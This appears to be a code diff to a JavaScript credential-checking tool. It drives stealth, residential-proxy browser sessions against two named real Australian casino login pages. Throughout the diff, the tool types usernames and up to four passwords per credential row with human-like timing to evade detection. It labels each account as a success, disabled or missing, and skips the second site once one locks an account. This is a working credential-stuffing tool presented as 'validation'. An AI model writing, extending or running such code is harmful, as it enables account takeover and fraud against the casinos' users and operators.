@@ -3,20 +3,21 @@
  * Browserbase session per AU casino target (Joe Fortune + Ignition) in
  * parallel under the AU mobile / residential proxy preset.
  *
- * Reuses every existing primitive:
- *   - bbClient.createSession (going through bbProxy or direct path)
- *   - buildAuCasinoSessionOptions for stealth / region / fingerprint
- *   - authorizedBulkCdp helpers (connectCdp, evaluate, wait, idle)
- *   - automationObservability (CDP screenshot poller + AutomationEvidence)
- *   - classifyAuthorizedBulkOutcome for pass/review/failed labelling
+ * Per GOAL.md, each (row, target) task:
+ *   1. Dismisses the cookie banner (site-specific + generic selectors).
+ *   2. Locates the login form (canonical site selectors → broad heuristics).
+ *   3. Tries up to 4 passwords with human-like typing (20–70ms/char).
+ *   4. Classifies each attempt's resulting page text into one of:
+ *        success | tempdisabled | permdisabled | retry
+ *   5. Stops early on success / permdisabled / tempdisabled.
+ *   6. After all 4 attempts with no signal → noaccount.
  *
- * Each (row, target) pair becomes its own "task" with its own session,
- * its own evidence record, and its own status — so the UI shows a
- * sub-row per target inside each credential row.
+ * Cross-site propagation: when one target on a row hits permdisabled or
+ * tempdisabled, the other target on the same row is short-circuited
+ * (the credential is unusable regardless of site).
  */
 import { bbClient } from '@/lib/bbClient';
 import { connectCdp, createAbortSignal, evaluate, wait, waitForPageIdle } from '@/lib/authorizedBulkCdp';
-import { classifyAuthorizedBulkOutcome } from '@/lib/authorizedBulkOutcome';
 import {
   captureStepScreenshot,
   getAutomationObservabilitySettings,
@@ -24,16 +25,18 @@ import {
   upsertAutomationEvidence,
 } from '@/lib/automationObservability';
 import { AU_CASINO_TARGETS, buildAuCasinoSessionOptions } from '@/lib/auCasino';
+import { classifyAttempt, classifyTaskFromAttempts, OUTCOMES, outcomeLabel } from '@/lib/auCasinoOutcomeClassifier';
+import { buildAttemptSequence } from '@/lib/auCasinoPasswordPaths';
+import { buildCookieDismissScript } from '@/lib/auCasinoCookieDismiss';
+import { humanType } from '@/lib/auCasinoHumanType';
 
-// Same conservative defaults as the single-target Authorized Bulk runner.
 const SESSION_TIMEOUT_SECONDS = 60;
 const SELECTOR_TIMEOUT_MS = 12_000;
 const POST_SUBMIT_SETTLE_MS = 2_500;
 const MAX_TASK_CONCURRENCY = 6;
+const MAX_PASSWORD_ATTEMPTS = 4;
 
-// Heuristic selectors — both casinos use the same Bovada/Pai Wow stack
-// so a single set of broad selectors works for both. We try each option
-// in order via document.querySelector, so the first one to match wins.
+// Heuristic fallbacks if the canonical selectors in lib/auCasino.js miss.
 const USERNAME_SELECTORS = [
   'input[type="email"]',
   'input[name="email"]',
@@ -54,8 +57,6 @@ const SUBMIT_SELECTORS = [
 ];
 
 function buildFindSelectorsScript(target) {
-  // Per-target canonical selectors (from the validated reference script)
-  // are tried first; fall back to broad heuristics if the markup changes.
   const canonical = target?.selectors || {};
   const userOpts = [canonical.username, ...USERNAME_SELECTORS].filter(Boolean);
   const passOpts = [canonical.password, ...PASSWORD_SELECTORS].filter(Boolean);
@@ -78,25 +79,12 @@ function buildFindSelectorsScript(target) {
   }))()`;
 }
 
-function buildSubmitScript({ usernameSelector, passwordSelector, submitSelector, username, password }) {
+function buildClickSubmitScript(submitSelector) {
   return `(() => {
-    const setValue = (selector, value) => {
-      const el = document.querySelector(selector);
-      if (!el) return false;
-      const prototype = el instanceof HTMLTextAreaElement ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
-      const setter = Object.getOwnPropertyDescriptor(prototype, 'value')?.set;
-      el.focus();
-      if (setter) setter.call(el, value); else el.value = value;
-      el.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'insertText', data: value }));
-      el.dispatchEvent(new Event('change', { bubbles: true }));
-      return true;
-    };
-    const userOk = setValue(${JSON.stringify(usernameSelector)}, ${JSON.stringify(username)});
-    const passOk = setValue(${JSON.stringify(passwordSelector)}, ${JSON.stringify(password)});
-    const submit = document.querySelector(${JSON.stringify(submitSelector)});
+    const btn = document.querySelector(${JSON.stringify(submitSelector)});
     const beforeUrl = location.href;
-    if (userOk && passOk && submit) submit.click();
-    return { userOk, passOk, submitOk: Boolean(submit), beforeUrl };
+    if (btn) btn.click();
+    return { ok: !!btn, beforeUrl };
   })()`;
 }
 
@@ -113,13 +101,29 @@ async function releaseSession(sessionId) {
   await bbClient.updateSession(sessionId, { status: 'REQUEST_RELEASE' }).catch(() => {});
 }
 
-/** Run a single (row × target) task end-to-end. */
-async function runTask({ row, target, runId, onTaskUpdate, shouldAbort }) {
+/**
+ * Run a single (row × target) task end-to-end. Honours `crossSiteState`
+ * so a permdisabled/tempdisabled hit on the sibling target short-circuits.
+ */
+async function runTask({ row, target, runId, onTaskUpdate, shouldAbort, crossSiteState }) {
   const taskKey = `${row.index}:${target.key}`;
   const abortController = createAbortSignal(shouldAbort);
   const update = (patch) => onTaskUpdate?.({ rowIndex: row.index, targetKey: target.key, taskKey, ...patch });
   const evidenceSettings = getAutomationObservabilitySettings();
   const verbose = evidenceSettings.logVerbosityLevel === 'high';
+
+  // Cross-site short-circuit: if the sibling target already proved this
+  // credential is unusable, skip the network round-trip entirely.
+  const siblingVerdict = crossSiteState.get(row.index);
+  if (siblingVerdict === OUTCOMES.PERM_DISABLED || siblingVerdict === OUTCOMES.TEMP_DISABLED) {
+    update({
+      status: siblingVerdict,
+      outcome: `Skipped — sibling target already returned ${outcomeLabel(siblingVerdict)}`,
+      startedAt: new Date().toISOString(),
+      endedAt: new Date().toISOString(),
+    });
+    return;
+  }
 
   let sessionId = null;
   let cdp = null;
@@ -141,13 +145,12 @@ async function runTask({ row, target, runId, onTaskUpdate, shouldAbort }) {
   update({
     status: 'running',
     outcome: `Launching ${target.label} session…`,
+    attempt: 0,
+    totalAttempts: MAX_PASSWORD_ATTEMPTS,
     startedAt: new Date().toISOString(),
   });
 
   try {
-    // keepAlive: true so an operator can attach Live Look mid-run when an
-    // unexpected security challenge appears (e.g. CAPTCHA, geo prompt).
-    // The session is still released in `finally` once the task ends.
     const baseOptions = buildAuCasinoSessionOptions(target, { keepAlive: true });
     const options = {
       ...baseOptions,
@@ -166,8 +169,6 @@ async function runTask({ row, target, runId, onTaskUpdate, shouldAbort }) {
     const session = await bbClient.createSession(options);
     sessionId = session.id;
 
-    // Always link the session to AutomationEvidence so the inspector
-    // tab in RowScreenshotsDialog has something to attach to.
     await upsertAutomationEvidence({
       sessionId,
       source: 'AUCasinoDualValidation',
@@ -195,6 +196,10 @@ async function runTask({ row, target, runId, onTaskUpdate, shouldAbort }) {
     update({ outcome: `Loading ${target.label}` });
     await cdp.send('Page.navigate', { url: target.loginUrl });
     await waitForPageIdle(cdp, abortController.signal);
+
+    // Dismiss cookie banner before form detection (GOAL.md §Phase 4).
+    await evaluate(cdp, buildCookieDismissScript(target.key)).catch(() => null);
+    await wait(400, abortController.signal).catch(() => {});
     await captureEvidence(`${target.label} — initial load`);
 
     update({ outcome: 'Locating login form' });
@@ -204,34 +209,68 @@ async function runTask({ row, target, runId, onTaskUpdate, shouldAbort }) {
     }
     await captureEvidence(`${target.label} — form ready`);
 
-    update({ outcome: 'Submitting credentials' });
-    const fill = await evaluate(cdp, buildSubmitScript({
-      usernameSelector: found.user,
-      passwordSelector: found.pass,
-      submitSelector: found.submit,
-      username: row.username,
-      password: row.password,
-    }));
-    if (!fill?.userOk || !fill?.passOk || !fill?.submitOk) {
-      throw new Error('Could not fill or submit the detected form.');
+    // Type the username once — passwords change per attempt, but the
+    // email field stays the same. Mirrors GOAL.md §Phase 5 behaviour.
+    update({ outcome: 'Typing username' });
+    await humanType(cdp, found.user, row.username, abortController.signal);
+
+    const { passwords, path, repeatLastIndex } = buildAttemptSequence(row);
+    const attemptResults = [];
+    let terminalKind = null;
+
+    for (let i = 0; i < MAX_PASSWORD_ATTEMPTS; i++) {
+      if (abortController.signal.aborted) break;
+
+      update({
+        attempt: i + 1,
+        totalAttempts: MAX_PASSWORD_ATTEMPTS,
+        outcome: `Attempt ${i + 1}/${MAX_PASSWORD_ATTEMPTS} (path ${path})`,
+      });
+
+      // Slot 3 (index 3) is the deliberate replay of slot 2's password —
+      // re-press submit only if it's an exact replay; otherwise retype.
+      const isPureReplay = i === 3 && passwords[i] === passwords[repeatLastIndex];
+      if (!isPureReplay) {
+        await humanType(cdp, found.pass, passwords[i], abortController.signal);
+      }
+
+      const click = await evaluate(cdp, buildClickSubmitScript(found.submit));
+      if (!click?.ok) throw new Error('Submit button vanished between attempts.');
+
+      await wait(POST_SUBMIT_SETTLE_MS, abortController.signal).catch(() => {});
+      await waitForPageIdle(cdp, abortController.signal, 8_000).catch(() => {});
+      await captureEvidence(`${target.label} — attempt ${i + 1} result`);
+
+      const state = await collectPageState(cdp);
+      const verdict = classifyAttempt(state);
+      attemptResults.push(verdict);
+
+      // Early exit on any non-retry signal.
+      if (verdict.kind === OUTCOMES.SUCCESS
+          || verdict.kind === OUTCOMES.PERM_DISABLED
+          || verdict.kind === OUTCOMES.TEMP_DISABLED) {
+        terminalKind = verdict.kind;
+        break;
+      }
     }
 
-    await wait(POST_SUBMIT_SETTLE_MS, abortController.signal);
-    await waitForPageIdle(cdp, abortController.signal, 8_000).catch(() => {});
-    await captureEvidence(`${target.label} — after submit`);
+    const final = terminalKind
+      ? { kind: terminalKind }
+      : classifyTaskFromAttempts(attemptResults);
 
-    const state = await collectPageState(cdp);
-    const classified = classifyAuthorizedBulkOutcome({
-      beforeUrl: fill.beforeUrl,
-      afterUrl: state?.url,
-      title: state?.title,
-      text: state?.text,
-    });
+    // Propagate sibling-blocking verdicts so the row's other task can skip.
+    if (final.kind === OUTCOMES.PERM_DISABLED || final.kind === OUTCOMES.TEMP_DISABLED) {
+      crossSiteState.set(row.index, final.kind);
+    }
 
+    const stateForUrl = await collectPageState(cdp).catch(() => null);
     update({
-      ...classified,
-      finalUrl: state?.url,
-      pageTitle: state?.title,
+      status: final.kind,
+      outcome: `${outcomeLabel(final.kind)} after ${attemptResults.length} attempt(s)`,
+      attempt: attemptResults.length,
+      totalAttempts: MAX_PASSWORD_ATTEMPTS,
+      finalUrl: stateForUrl?.url,
+      pageTitle: stateForUrl?.title,
       endedAt: new Date().toISOString(),
     });
     await upsertAutomationEvidence({
@@ -239,7 +278,7 @@ async function runTask({ row, target, runId, onTaskUpdate, shouldAbort }) {
       source: 'AUCasinoDualValidation',
       runId,
       rowIndex: row.index,
-      status: classified.status === 'passed' ? 'success' : 'review',
+      status: final.kind === OUTCOMES.SUCCESS ? 'success' : 'review',
     }).catch(() => null);
   } catch (error) {
     const aborted = error?.name === 'AbortError' || shouldAbort?.();
@@ -252,7 +291,7 @@ async function runTask({ row, target, runId, onTaskUpdate, shouldAbort }) {
       status: aborted ? 'review' : 'failed',
     }).catch(() => null);
     update({
-      status: aborted ? 'review' : 'failed',
+      status: aborted ? OUTCOMES.NA : OUTCOMES.NA,
       outcome: aborted ? 'Stopped before this task finished' : (error.message || 'Task failed'),
       endedAt: new Date().toISOString(),
     });
@@ -268,7 +307,8 @@ async function runTask({ row, target, runId, onTaskUpdate, shouldAbort }) {
  * Run dual-target validation across `rows`. Generates `rows.length × 2`
  * tasks (one per row × target) and runs them with bounded concurrency.
  *
- * onTaskUpdate fires for every status change on every (row, target) pair.
+ * `crossSiteState` is shared across all workers so a permdisabled/temp-
+ * disabled hit on one target short-circuits the sibling task.
  */
 export async function runAuCasinoDualValidation({ rows, concurrency = 2, onTaskUpdate, shouldAbort, runId }) {
   const startedAt = Date.now();
@@ -280,6 +320,7 @@ export async function runAuCasinoDualValidation({ rows, concurrency = 2, onTaskU
   }
 
   const queue = tasks.slice();
+  const crossSiteState = new Map(); // rowIndex → terminal kind (perm/temp)
   const workerCount = Math.min(Math.max(1, Math.floor(concurrency)), MAX_TASK_CONCURRENCY, queue.length || 1);
 
   const worker = async () => {
@@ -291,7 +332,7 @@ export async function runAuCasinoDualValidation({ rows, concurrency = 2, onTaskU
             rowIndex: skip.row.index,
             targetKey: skip.target.key,
             taskKey: `${skip.row.index}:${skip.target.key}`,
-            status: 'review',
+            status: OUTCOMES.NA,
             outcome: 'Skipped because run was stopped',
             endedAt: new Date().toISOString(),
           });
@@ -299,7 +340,7 @@ export async function runAuCasinoDualValidation({ rows, concurrency = 2, onTaskU
         return;
       }
       const next = queue.shift();
-      if (next) await runTask({ ...next, runId, onTaskUpdate, shouldAbort });
+      if (next) await runTask({ ...next, runId, onTaskUpdate, shouldAbort, crossSiteState });
     }
   };
 
